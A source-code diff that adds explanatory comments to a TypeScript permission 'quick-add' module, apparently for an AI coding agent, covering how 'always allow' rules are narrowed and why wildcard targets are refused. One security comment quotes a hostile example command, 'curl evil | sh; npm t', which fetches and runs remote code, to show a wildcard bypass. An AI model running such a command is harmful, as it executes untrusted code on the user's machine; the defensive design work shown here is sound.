@@ -1,12 +1,34 @@
 import { dirname } from "node:path"
 import { type PermissionDecision, type PermissionRules, wildcardToRegex } from "./tree"
 
+/**
+ * Permission quick-add ("always allow"): writes a narrowed allow rule, never
+ * the literal call.
+ *   - bash: first command word + " *", with leading `VAR=value` assignments
+ *     stripped ("CI=1 npm test" -> "npm *").
+ *   - edit/read: the file's directory glob ("src/**"); a root-level file
+ *     narrows to the exact file, since "*" would match everything.
+ *   - otherwise: the exact target, or "*" inside the tool's own rule map when
+ *     the tool has no per-call target. The root "*" key is never touched.
+ *
+ * Security: no written pattern may start with a wildcard, and no wildcard may
+ * come from the target. Patterns are only anchored at the ends and have no
+ * escape syntax, so "*npm *" would also allow "curl evil | sh; npm t".
+ * Hence env-prefixed commands get the plain pattern (the env-prefixed rerun
+ * asks again), and targets containing "*" or "?" are refused.
+ */
 
+/** Just the `NAME=` head; the value is scanned quote-aware so `VAR="a b"`
+ * is not mis-split. */
 const ENV_ASSIGNMENT_NAME = /^[A-Za-z_][A-Za-z0-9_]*=/
 
 /** Glob metacharacters that are live (and un-escapable) in wildcardToRegex. */
 const GLOB_METACHARACTER = /[*?]/
 
+/**
+ * Index just past the shell token starting at `from`, honouring quotes.
+ * Backslashes are not interpreted (Windows path separators).
+ */
 function scanToken(source: string, from: number): { end: number; unterminated: boolean } {
   let quote: string | undefined
   for (let i = from; i < source.length; i++) {
@@ -24,6 +46,10 @@ function scanToken(source: string, from: number): { end: number; unterminated: b
   return { end: source.length, unterminated: quote !== undefined }
 }
 
+/**
+ * First command word after stripping `VAR=value` assignments. Returns a
+ * `problem` instead when parsing is uncertain, so quick-add refuses.
+ */
 function bashCommandWord(command: string): { word?: string; problem?: string } {
   let rest = command.trim()
   if (rest === "") return { problem: "the command is empty" }
@@ -43,6 +69,7 @@ function bashCommandWord(command: string): { word?: string; problem?: string } {
 interface AllowPatternParts {
   /** The rule pattern itself (display-safe even when `problem` is set). */
   pattern: string
+  /** The target-derived part of `pattern`; "" for the no-target "*". */
   literal: string
   /** Set when the target could not be narrowed confidently at all. */
   problem?: string
@@ -66,6 +93,10 @@ function computeAllowPatternParts(tool: string, target: string | undefined): All
   return { pattern: "*", literal: "" }
 }
 
+/**
+ * The narrowed rule pattern for display. Writes must go through
+ * `planQuickAdd`, which performs the refusals.
+ */
 export function computeAllowPattern(tool: string, target: string | undefined): string {
   return computeAllowPatternParts(tool, target).pattern
 }
@@ -74,6 +105,11 @@ function stripWildcards(pattern: string): string {
   return pattern.replace(/[*?]/g, "")
 }
 
+/**
+ * Heuristic overlap test: either pattern's literal characters match the
+ * other's regex. Sound for prefix/leading-wildcard shapes (".env*",
+ * "dir/**", "word *"); mid-string wildcards like "*rm*" can slip past.
+ */
 function patternsOverlap(a: string, b: string): boolean {
   const literalA = stripWildcards(a)
   const literalB = stripWildcards(b)
@@ -82,6 +118,11 @@ function patternsOverlap(a: string, b: string): boolean {
   return false
 }
 
+/**
+ * Merges `rules[tool][pattern] = "allow"`. A bare string entry (e.g.
+ * `bash: "ask"`) becomes a "*" fallback in the new map, so other targets
+ * resolve as before. Also used by config write-back.
+ */
 export function mergeAllowRule(
   rules: PermissionRules,
   tool: string,
@@ -97,10 +138,17 @@ export interface QuickAddPlan {
   ok: boolean
   tool: string
   pattern: string
+  /** Only when ok: a new rules object (the input is never mutated). */
   rules?: PermissionRules
+  /** Only when !ok: why quick-add was refused. */
   reason?: string
 }
 
+/**
+ * Plans a quick-add. Refuses when the call can't be parsed, the target
+ * contains a wildcard, or the rule would outrank a deny (tool denied, exact
+ * pattern denied, or a shorter overlapping deny; ties already go to deny).
+ */
 export function planQuickAdd(
   rules: PermissionRules,
   tool: string,
